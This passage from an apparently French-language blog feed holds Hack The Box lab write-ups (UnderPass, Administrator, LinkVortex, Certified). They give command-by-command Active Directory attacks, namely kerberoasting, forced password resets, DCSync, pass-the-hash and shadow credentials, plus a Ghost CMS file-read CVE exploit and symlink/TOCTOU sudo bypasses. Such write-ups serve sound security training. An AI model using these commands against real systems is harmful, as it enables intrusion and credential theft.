secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User svcMosh may run the following commands on localhost: (ALL) NOPASSWD: /usr/bin/mosh-server svcMosh@underpass:~$ sudo /usr/bin/mosh-server MOSH CONNECT 60002 zl0g6Tbx/KIgOR0jzdQ9wA \u0026lt;...\u0026gt; svcMosh@underpass:~$ MOSH_KEY=zl0g6Tbx/KIgOR0jzdQ9wA mosh-client 127.0.0.1 60002 root@underpass:~# pwd /root root@underpass:~# ls root.txt ","date":"2025-05-10T00:00:00Z","image":"https://01MI.github.io/p/underpass-htb-writeup-linux-easy/UnderPass_hu_13c39bad291cb91e.PNG","permalink":"https://01MI.github.io/fr/p/underpass-htb-writeup-linux-easy/","title":"UnderPass - Linux Easy - HTB Writeup"},{"content":"Si vous êtes familier avec les box windows, cette box est très simple car elle reprend des chemins d\u0026rsquo;exploitation classiques.\nRésumé User: ACL-based privileges\nRoot: ACL-based privileges, DCsync\nEnumeration A l’aide d’un scan nmap, nous pouvons identifier que cette machine est un contrôleur de domaine Active Directory. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $ nmap -Pn -p- 10.10.11.42 -v PORT STATE SERVICE 21/tcp open ftp 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49669/tcp open unknown 52649/tcp open unknown 59626/tcp open unknown 59631/tcp open unknown 59638/tcp open unknown 59643/tcp open unknown 59655/tcp open unknown On utilise bloodhound-python avec le compte fourni Olivia:ichliebedich afin de récupérer des informations concernant le domaine administrator.htb (qu\u0026rsquo;on ajoute à notre /etc/hosts).\nRapidement, nous identifions qu\u0026rsquo;il va falloir compromettre le compte d\u0026rsquo;Ethan pour DCSync et récupérer le hash du domain admin. User GenericWrite, Olivia -\u0026gt; Michael Afin de compromettre le compte d\u0026rsquo;Ethan, nous devons compromettre le compte d\u0026rsquo;Emily qui a les privilèges GenericWrite sur le compte d\u0026rsquo;Ethan. Comme on peut le voir il n\u0026rsquo;y a pas de chemin direct vers Emily depuis le compte de Olivia. On va se concentrer sur les accès qu\u0026rsquo;à notre user initial Olivia.\nElle a les privilèges GenericAll sur Michael, on va donc procéder à une attaque ciblée kerberoast afin de récupérer son hash.\nLe hash ne pouvant pas être cracké, on va utiliser les privilèges d\u0026rsquo;Olivia pour forcer le changement du mot de passe de Michael. 1 2 3 4 5 6 7 8 9 $ ./targetedKerberoast.py -v -d \u0026#39;administrator.htb\u0026#39; -u \u0026#39;olivia\u0026#39; -p \u0026#39;ichliebedich\u0026#39; [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [VERBOSE] SPN added successfully for (michael) [+] Printing hash for (michael) $krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$64da\u0026lt;...\u0026gt;d [VERBOSE] SPN removed successfully for (michael) $ net rpc password \u0026#34;michael\u0026#34; \u0026#34;michael_pass\u0026#34; -U \u0026#34;administrator.htb\u0026#34;/\u0026#34;olivia\u0026#34;%\u0026#34;ichliebedich\u0026#34; -S \u0026#34;administrator.htb\u0026#34; ForceChangePassword, Michael -\u0026gt; Benjamin En continuant notre énumération sur BH, on remarque que Michael peut changer le mot de passe de Benjamin.\nOn utilise la même commande précédemment utilisée pour ce changement. 1 $ net rpc password \u0026#34;benjamin\u0026#34; \u0026#34;benjamin_pass\u0026#34; -U \u0026#34;administrator.htb\u0026#34;/\u0026#34;michael\u0026#34;%\u0026#34;michael_pass\u0026#34; -S \u0026#34;administrator.htb\u0026#34; Benjamin fait partie du groupe SHARE MODERATORS. On ne découvre rien d\u0026rsquo;intéressant sur les shares SMB mais, sur le FTP on trouve Backup.psafe3 que l\u0026rsquo;on récupère et dont on crack le mot de passe avec hashcat.\nFTP et Backup.psafe3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 $ ftp benjamin@10.10.11.42 \u0026lt;...\u0026gt; ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||50350|) 125 Data connection already open; Transfer starting. 10-05-24 09:13AM 952 Backup.psafe3 226 Transfer complete. ftp\u0026gt; mget backup.psafe3 mget Backup.psafe3 [anpqy?]? yes 229 Entering Extended Passive Mode (|||50354|) 125 Data connection already open; Transfer starting. 100% |*******************************************************************************************| 952 56.85 KiB/s 00:00 ETA 226 Transfer complete. \u0026lt;...\u0026gt; ftp\u0026gt; exit 221 Goodbye. $ hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt \u0026lt;...\u0026gt; Backup.psafe3:\u0026lt;...\u0026gt; Session..........: hashcat Status...........: Cracked Hash.Mode........: 5200 (Password Safe v3) Hash.Target......: Backup.psafe3 Time.Started.....: Sat Apr 19 20:18:43 2025 (1 sec) Time.Estimated...: Sat Apr 19 20:18:44 2025 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 23899 H/s (6.93ms) @ Accel:256 Loops:1024 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 5120/14344385 (0.04%) Rejected.........: 0/5120 (0.00%) Restore.Point....: 4608/14344385 (0.03%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049 Candidate.Engine.: Device Generator Candidates.#1....: Liverpool -\u0026gt; babygrl Hardware.Mon.#1..: Util: 60% Started: Sat Apr 19 20:18:42 2025 Stopped: Sat Apr 19 20:18:45 2025 On utilise ce mot de passe pour ouvrir le fichier avec pwsafe et on récupère le mot de passe d\u0026rsquo;Emily. 1 $ pwsafe Backup.psafe3 On constate dans BH qu\u0026rsquo;Emily peut accéder à la machine, on s\u0026rsquo;y connecte avec evil-winrm pour récupérer le user.txt.\n1 2 3 4 5 6 7 8 $ evil-winrm -i 10.10.11.42 -u emily -p U\u0026lt;...\u0026gt;b \u0026lt;...\u0026gt; *Evil-WinRM* PS C:\\Users\\emily\\Documents\u0026gt; cd ../Desktop *Evil-WinRM* PS C:\\Users\\emily\\Desktop\u0026gt; dir Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/30/2024 2:23 PM 2308 Microsoft Edge.lnk -ar--- 4/19/2025 3:02 PM 34 user.txt Root GenericWrite, Emily -\u0026gt; Ethan Comme vu précédemment, Emily a les privilèges GenericWrite sur le compte d\u0026rsquo;Ethan et Ethan peut DCsync.\nOn va d\u0026rsquo;abord récupérer le hash d\u0026rsquo;Ethan et le cracker avec hashcat. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 $ ./targetedKerberoast.py -v -d \u0026#39;administrator.htb\u0026#39; -u \u0026#39;emily\u0026#39; -p \u0026#39;U\u0026lt;...\u0026gt;b\u0026#39; [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [VERBOSE] SPN added successfully for (ethan) [+] Printing hash for (ethan) $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$3\u0026lt;...\u0026gt;7 [VERBOSE] SPN removed successfully for (ethan) $ hashcat -a 0 -m 13100 hash /usr/share/wordlists/rockyou.txt \u0026lt;...\u0026gt; $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$3\u0026lt;...\u0026gt;7:l\u0026lt;...\u0026gt;t Session..........: hashcat Status...........: Cracked Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP) Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....9cb327 Time.Started.....: Sat Apr 19 20:39:25 2025 (0 secs) Time.Estimated...: Sat Apr 19 20:39:25 2025 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 641.4 kH/s (0.52ms) @ Accel:256 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 5120/14344385 (0.04%) Rejected.........: 0/5120 (0.00%) Restore.Point....: 4608/14344385 (0.03%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: Liverpool -\u0026gt; babygrl Hardware.Mon.#1..: Util: 71% Started: Sat Apr 19 20:39:24 2025 Stopped: Sat Apr 19 20:39:27 2025 DCSync Puis, on peut effectuer un DCsync avec le mot de passe obtenu en utilisant secretsdump. 1 2 3 4 5 $ ./secretsdump.py \u0026#39;administrator.htb\u0026#39;/\u0026#39;ethan\u0026#39;:\u0026#39;l\u0026lt;...\u0026gt;t\u0026#39;@\u0026#39;administrator.htb\u0026#39; \u0026lt;...\u0026gt; Administrator:500:a\u0026lt;...\u0026gt;e\u0026gt;:3\u0026lt;...\u0026gt;e::: \u0026lt;...\u0026gt; [*] Cleaning up... On peut maintenant utiliser evil-winrm pour se connecter au DC avec le NTHASH de l\u0026rsquo;admin. 1 2 3 4 5 6 7 $ evil-winrm -i 10.10.11.42 -u administrator -H 3\u0026lt;...\u0026gt;e \u0026lt;...\u0026gt; *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; cd ../Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; dir Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 4/19/2025 6:52 PM 34 root.txt ","date":"2025-04-19T00:00:00Z","image":"https://01MI.github.io/p/administrator-htb-writeup-windows-medium/Administrator_hu_ed4e04bc14c04332.PNG","permalink":"https://01MI.github.io/fr/p/administrator-htb-writeup-windows-medium/","title":"Administrator - Windows Medium - HTB Writeup"},{"content":"Résumé User: Répertoire .git exposé \u0026amp; CVE-2023-40028\nRoot: Exploitation de liens symboliques imbriqués ou TOCTOU\nEnumeration A l\u0026rsquo;aide d\u0026rsquo;un scan nmap, on identifie qu\u0026rsquo;un serveur web et SSH sont actifs. 1 2 3 4 5 $ nmap -Pn -p- 10.10.11.47 -v PORT STATE SERVICE 22/tcp open ssh 80/tcp open http User Fuzzing Le port 80 expose un site \u0026ldquo;BitByBit Hardware\u0026rdquo; utilisant Ghost CMS. Après l’avoir ajouté à notre fichier hosts, on le fuzz et on découvre un sous-domaine : dev.linkvortex.htb 1 2 3 $ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://linkvortex.htb -H \u0026#34;host: FUZZ.linkvortex.htb\u0026#34; -fs 230 \u0026lt;...\u0026gt; dev [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 15ms] Le fuzzing de ce sous-domaine révèle la présence d’un répertoire .git.\n1 2 3 4 5 6 7 8 9 $ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://dev.linkvortex.htb/FUZZ \u0026lt;...\u0026gt; .git [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 15ms] .git/HEAD [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 18ms] .git/logs/ [Status: 200, Size: 868, Words: 59, Lines: 16, Duration: 19ms] .git/config [Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 17ms] .git/index [Status: 200, Size: 707577, Words: 2171, Lines: 2172, Duration: 17ms] index.html [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 16ms] server-status [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 19ms] On peut alors utiliser l\u0026rsquo;outil GitHack pour récupérer une partie du code source original.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ ./GitHack.py http://dev.linkvortex.htb/.git/ \u0026lt;...\u0026gt; $ tree dev.linkvortex.htb dev.linkvortex.htb ├── Dockerfile.ghost └── ghost └── core └── test └── regression └── api └── admin └── authentication.test.js 7 directories, 2 files Parmi les fichiers récupérés, on a authentication.test.js, qui contient le mot de passe de l\u0026rsquo;administrateur:\n1 2 3 4 5 6 7 8 9 10 11 $ less ghost/core/test/regression/api/admin/authentication.test.js \u0026lt;...\u0026gt; it(\u0026#39;complete setup\u0026#39;, async function () { const email = \u0026#39;test@example.com\u0026#39;; const password = \u0026#39;OctopiFociPilfer45\u0026#39;; const requestMock = nock(\u0026#39;https://api.github.com\u0026#39;) .get(\u0026#39;/repos/tryghost/dawn/zipball\u0026#39;) .query(true) .replyWithFile(200, fixtureManager.getPathForFixture(\u0026#39;themes/valid.zip\u0026#39;)); \u0026lt;...\u0026gt; On peut utiliser ce mot de passe pour accéder à l\u0026rsquo;interface d\u0026rsquo;administration(on devine facilement le username admin@linkvortex.htb) en s\u0026rsquo;y connectant via http://linkvortex.htb/ghost/#/signin, mais ça ne nous permet pas d\u0026rsquo;aller plus loin.\nCependant, dans le fichier Dockerfile.ghost, on trouve la version de Ghost : 5.58.0, qui est vulnérable à la CVE-2023-40028.\nCette vulnérabilité nous permet de lire un fichier arbitraire. 1 2 3 $ cat Dockerfile.ghost FROM ghost:5.58.0 \u0026lt;...\u0026gt; On peut tester l\u0026rsquo;exploit suivant:CVE-2023-40028 pour lire le fichier /etc/passwd.\n1 2 3 4 5 6 7 $ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb WELCOME TO THE CVE-2023-40028 SHELL Enter the file path to read (or type \u0026#39;exit\u0026#39; to quit): /etc/passwd File content: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin \u0026lt;...\u0026gt; Quel autre fichier intéressant peut-on lire ? En regardant à nouveau le fichier Dockerfile.ghost, on trouve le chemin d’un fichier de configuration: /var/lib/ghost/config.production.json.\n1 2 3 4 5 6 $ cat Dockerfile.ghost FROM ghost:5.58.0 # Copy the config COPY config.production.json /var/lib/ghost/config.production.json \u0026lt;...\u0026gt; La lecture de ce fichier nous donne les identifiants de l\u0026rsquo;utilisateur bob.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb WELCOME TO THE CVE-2023-40028 SHELL Enter the file path to read (or type \u0026#39;exit\u0026#39; to quit): /var/lib/ghost/config.production.json File content: \u0026lt;...\u0026gt; \u0026#34;mail\u0026#34;: { \u0026#34;transport\u0026#34;: \u0026#34;SMTP\u0026#34;, \u0026#34;options\u0026#34;: { \u0026#34;service\u0026#34;: \u0026#34;Google\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;linkvortex.htb\u0026#34;, \u0026#34;port\u0026#34;: 587, \u0026#34;auth\u0026#34;: { \u0026#34;user\u0026#34;: \u0026#34;bob@linkvortex.htb\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;fibber-talented-worth\u0026#34; } } } Avec ces identifiants, on se connecte en SSH et on récupère le flag utilisateur. 1 2 3 4 $ ssh bob@linkvortex.htb bob@linkvortex:~$ pwd; ls /home/bob user.txt Root Liens symboliques En exécutant la commande sudo -l, on voit que bob peut exécuter le script clean_symlink.sh en tant que root sans mot de passe: 1 2 3 4 5 6 7 8 bob@linkvortex:~$ sudo -l Matching Defaults entries for bob on linkvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT User bob may run the following commands on linkvortex: (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png Si on regarde la seconde partie du script, on constate qu’il vérifie la présence de etc ou root dans le chemin ciblé par le lien symbolique. Si ces termes sont détectés, le lien est supprimé.\nSinon, le .png est déplacé dans /var/quarantined, et, si la variable d’environnement CHECK_CONTENT est définie à true, le contenu du fichier nous est renvoyé.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh #!/bin/bash QUAR_DIR=\u0026#34;/var/quarantined\u0026#34; if [ -z $CHECK_CONTENT ];then CHECK_CONTENT=false fi LINK=$1 if ! [[ \u0026#34;$LINK\u0026#34; =~ \\.png$ ]]; then /usr/bin/echo \u0026#34;! First argument must be a png file !\u0026#34; exit 2 fi if /usr/bin/sudo /usr/bin/test -L $LINK;then LINK_NAME=$(/usr/bin/basename $LINK) LINK_TARGET=$(/usr/bin/readlink $LINK) if /usr/bin/echo \u0026#34;$LINK_TARGET\u0026#34; | /usr/bin/grep -Eq \u0026#39;(etc|root)\u0026#39;;then /usr/bin/echo \u0026#34;! Trying to read critical files, removing link [ $LINK ] !\u0026#34; /usr/bin/unlink $LINK else /usr/bin/echo \u0026#34;Link found [ $LINK ] , moving it to quarantine\u0026#34; /usr/bin/mv $LINK $QUAR_DIR/ if $CHECK_CONTENT;then /usr/bin/echo \u0026#34;Content:\u0026#34; /usr/bin/cat $QUAR_DIR/$LINK_NAME 2\u0026gt;/dev/null fi fi fi On peut utiliser deux approches pour contourner ces vérifications et lire root.txt : les liens symboliques imbriqués ou en exploitant la race condition entre la verification du lien symbolique et la lecture de celui-ci.\nMethode 1: Liens symboliques imbriqués On crée deux liens symboliques, link1.png vers link2.png et link2.png vers /root/root.txt.\nDe cette façon, link1 contourne la vérification des termes.\n/home/bob/link1.png -\u0026gt; /home/bob/link2.png -\u0026gt; root.txt\n1 2 3 4 5 6 7 bob@linkvortex:~$ export CHECK_CONTENT=true bob@linkvortex:~$ ln -s /root/root.txt link2.png bob@linkvortex:~$ ln -s $PWD/link2.png link1.png bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh link1.png Link found [ link1.png ] , moving it to quarantine Content: 6\u0026lt;...\u0026gt;3 Methode 2: TOCTOU Le script vérifie si le fichier est un lien symbolique via /usr/bin/test -L link.png. Ensuite, il utilise basename et readlink en se basant sur cette hypothèse.\nEntre cette vérification et la lecture du lien, on peut exploiter la vulnérabilité en interchangeant continuellement la cible du lien symbolique de /tmp/random à /root/root.txt.\nDans un premier terminal, on exécute une boucle qui interchange la cible du lien.\nDans un autre terminal, on exécute en boucle le script.\nSi le timing est bon, le script renvoie le contenu de root.txt.\nCette vulnérabilité est connue sous le nom de TOCTOU (Time-of-Check to Time-of-Use).\nEn s\u0026rsquo;aidant de cet article, on peut essayer d’accéder à root.txt.\nTerminal 1 1 2 3 4 bob@linkvortex:~$ timeout 5s bash -c \u0026#39;while true; do ln -sf $PWD/random $PWD/link.png; ln -sf /root/root.txt $PWD/link.png; done\u0026#39; ln: failed to create symbolic link \u0026#39;/home/bob/link.png\u0026#39;: File exists ln: failed to create symbolic link \u0026#39;/home/bob/link.png\u0026#39;: File exists \u0026lt;...\u0026gt; Terminal 2 1 2 3 4 5 6 7 8 9 bob@linkvortex:~$ timeout 2s bash -c \u0026#39;while true; do sudo /usr/bin/bash /opt/ghost/clean_symlink.sh link.png; done\u0026#39; Link found [ link.png ] , moving it to quarantine Content: 6\u0026lt;...\u0026gt;3 ! Trying to read critical files, removing link [ link.png ] ! Link found [ link.png ] , moving it to quarantine Content: 6\u0026lt;...\u0026gt;3 \u0026lt;...\u0026gt; Ressources CVE-2023-40028 exploit\nGitHack\nCTF Writeup: picoCTF 2023 - \u0026ldquo;Tic-Tac\u0026rdquo;\n","date":"2025-04-13T00:00:00Z","image":"https://01MI.github.io/p/linkvortex-htb-writeup-linux-easy/LinkVortex_hu_3426985da32ddd52.PNG","permalink":"https://01MI.github.io/fr/p/linkvortex-htb-writeup-linux-easy/","title":"LinkVortex - Linux Easy - HTB Writeup"},{"content":"Ceci est mon premier writeup pour une box HTB.\nRésumé User: Abus d\u0026rsquo;ACL\nRoot: Abus template ADCS\nEnumeration A l\u0026rsquo;aide d\u0026rsquo;un scan nmap, nous pouvons identifier que cette machine est un contrôleur de domaine Active Directory.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ nmap 10.10.11.41 -Pn -v PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nous pouvons utiliser bloodhound-python avec le compte fourni judith.mader afin de récupérer des informations concernant le domaine certified.htb. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ bloodhound-python -u \u0026#39;judith.mader\u0026#39; -p \u0026#39;judith09\u0026#39; -ns 10.10.11.41 -d certified.htb -c all INFO: Found AD domain: certified.htb INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.certified.htb:88)] [Errno -2] Name or service not known INFO: Connecting to LDAP server: dc01.certified.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc01.certified.htb INFO: Found 10 users INFO: Found 53 groups INFO: Found 2 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: DC01.certified.htb INFO: Done in 00M 03S Dans BloodHound, nous pouvons facilement remarquer quel chemin prendre afin d\u0026rsquo;obtenir un accès interactif avec la machine. User Judith -\u0026gt; Management Group Nous remarquons que Judith a la permission WriteOwner sur le groupe management. Cette permission nous permet d\u0026rsquo;ajouter Judith en tant que propriétaire et membre du groupe. Premièrement, nous changeons le propriétaire du groupe. 1 2 3 4 5 6 7 8 9 $ ./owneredit.py -action write -new-owner \u0026#39;judith.mader\u0026#39; -target \u0026#39;MANAGEMENT\u0026#39; \u0026#39;CERTIFIED.HTB\u0026#39;/\u0026#39;judith.mader\u0026#39;:\u0026#39;judith09\u0026#39; Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Current owner information below [*] - SID: S-1-5-21-729746778-2675978091-3820388244-512 [*] - sAMAccountName: Domain Admins [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb [*] OwnerSid modified successfully! Ensuite, nous ajoutons Judith en tant que membre du groupe. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ ./dacledit.py -k \u0026#39;certified.htb/judith.mader:judith09\u0026#39; -dc-ip certified.htb -principal judith.mader -target \u0026#34;management\u0026#34; -action write -rights FullControl [-] CCache file is not found. Skipping... [*] DACL backed up to dacledit-20250314-002015.bak [*] DACL modified successfully! $ net rpc group members \u0026#34;management\u0026#34; -U \u0026#39;judith.mader\u0026#39; -S certified.htb Password for [WORKGROUP\\judith.mader]: CERTIFIED\\management_svc $ net rpc group addmem \u0026#34;management\u0026#34; judith.mader -U \u0026#39;judith.mader\u0026#39; -S certified.htb $ net rpc group members \u0026#34;management\u0026#34; -U \u0026#39;judith.mader\u0026#39; -S certified.htb Password for [WORKGROUP\\judith.mader]: CERTIFIED\\judith.mader CERTIFIED\\management_svc Management group -\u0026gt; management_svc En revenant sur BloodHound, nous remarquons que management_svc est kerberoastable mais le hash obtenu n\u0026rsquo;est pas crackable. Nous pouvons voir que les membres du groupe management ont la permission GenericWrite sur l\u0026rsquo;utilisateur management_svc. En exploitant cette permission, nous pouvons utiliser la technique shadow credentials afin d\u0026rsquo;obtenir le NT hash de management_svc. Premièrement, nous générons un fichier .pfx et l\u0026rsquo;utilisons pour alimenter l\u0026rsquo;attribut msDS-KeyCredentialLink de management_svc en utilisant Pywhisker. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ ./pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;judith.mader\u0026#34; -p \u0026#34;judith09\u0026#34; --target \u0026#34;management_svc\u0026#34; --action \u0026#34;add\u0026#34; [*] Searching for the target account [*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: d1df9aac-4ae1-36e0-f803-d8e369ed930e [*] Updating the msDS-KeyCredentialLink attribute of management_svc [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u0026gt; PFX with cryptography: 9JZGbAPu.pfx [+] PFX exportiert nach: 9JZGbAPu.pfx [i] Passwort für PFX: c2U4qtZsMkLNEedx4nFb [+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: 9JZGbAPu.pfx [*] Must be used with password: c2U4qtZsMkLNEedx4nFb [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools Ensuite, nous obtenons un TGT pour management_svc et le NT hash en utilisant PKINITtools. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ ./gettgtpkinit.py certified.htb/management_svc -cert-pfx 9JZGbAPu.pfx -pfx-pass c2U4qtZsMkLNEedx4nFb management_svc.ccache 2025-03-14 01:42:02,044 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2025-03-14 01:42:02,082 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT 2025-03-14 01:42:02,138 minikerberos INFO AS-REP encryption key (you might need this later): INFO:minikerberos:AS-REP encryption key (you might need this later): 2025-03-14 01:42:02,138 minikerberos INFO 37b5b0b8873bb21cdf40daad3dcf408af0be706f772bf52dda96dbecfa00f041 INFO:minikerberos:37b5b0b8873bb21cdf40daad3dcf408af0be706f772bf52dda96dbecfa00f041 2025-03-14 01:42:02,141 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved TGT to file $ KRB5CCNAME=management_svc.ccache ./getnthash.py CERTIFIED.HTB/management_svc -key 37b5b0b8873bb21cdf40daad3dcf408af0be706f772bf52dda96dbecfa00f041 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache [*] Requesting ticket to self with PAC Recovered NT Hash a\u0026lt;...\u0026gt;4 $ crackmapexec smb 10.10.11.41 -u \u0026#34;management_svc\u0026#34; -H a\u0026lt;...\u0026gt;4 SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False) SMB 10.10.11.41 445 DC01 [+] certified.htb\\management_svc:a\u0026lt;...\u0026gt;4 Ensuite, nous pouvons utiliser evil-winrm pour obtenir un shell sur la machine via l\u0026rsquo;utilisateur management_svc. Même si le port n\u0026rsquo;est pas indiqué comme ouvert sur le scan initial de nmap, il est ouvert.\nFinalement, nous pouvons récupérer le hash pour la partie utilisateur. 1 2 3 4 5 6 $ evil-winrm -i 10.10.11.41 -u management_svc -H a\u0026lt;...\u0026gt;4 \u0026lt;...\u0026gt; *Evil-WinRM* PS C:\\Users\\management_svc\\Desktop\u0026gt; dir Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 3/13/2025 2:54 PM 34 user.txt Root management_svc -\u0026gt; ca_operator Maintenant que management_svc est compromis, nous pouvons observer dans BloodHound que ca_operator peut aussi être compromis en utilisant la même technique abusant cette fois-ci de la permission GenericAll que management_svc a sur ca_operator. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 $ ./pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;management_svc\u0026#34; -H \u0026#34;a\u0026lt;...\u0026gt;4\u0026#34; --target \u0026#34;ca_operator\u0026#34; --action \u0026#34;add\u0026#34; [*] Searching for the target account [*] Target user found: CN=operator ca,CN=Users,DC=certified,DC=htb [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: 174934b2-1249-c39a-bc89-5b4b5c01b784 [*] Updating the msDS-KeyCredentialLink attribute of ca_operator [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u0026gt; PFX with cryptography: zlax30FB.pfx [+] PFX exportiert nach: zlax30FB.pfx [i] Passwort für PFX: CiktaI0YO7y9IV9T9mnM [+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: zlax30FB.pfx [*] Must be used with password: CiktaI0YO7y9IV9T9mnM [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools $ ./gettgtpkinit.py certified.htb/ca_operator -cert-pfx EkDY6hor.pfx -pfx-pass WlZFTKpVBy3BzPXcgzCX ca_operator.ccache 2025-03-14 03:11:26,295 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2025-03-14 03:11:26,333 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT 2025-03-14 03:11:50,020 minikerberos INFO AS-REP encryption key (you might need this later): INFO:minikerberos:AS-REP encryption key (you might need this later): 2025-03-14 03:11:50,020 minikerberos INFO 91a30e694f68d016d12e103de8305e1b124aee33130f0795aec79178e9e46b41 INFO:minikerberos:91a30e694f68d016d12e103de8305e1b124aee33130f0795aec79178e9e46b41 2025-03-14 03:11:50,023 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved TGT to file $ ./getnthash.py CERTIFIED.HTB/ca_operator -key 91a30e694f68d016d12e103de8305e1b124aee33130f0795aec79178e9e46b41 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache [*] Requesting ticket to self with PAC Recovered NT Hash b\u0026lt;...\u0026gt;2 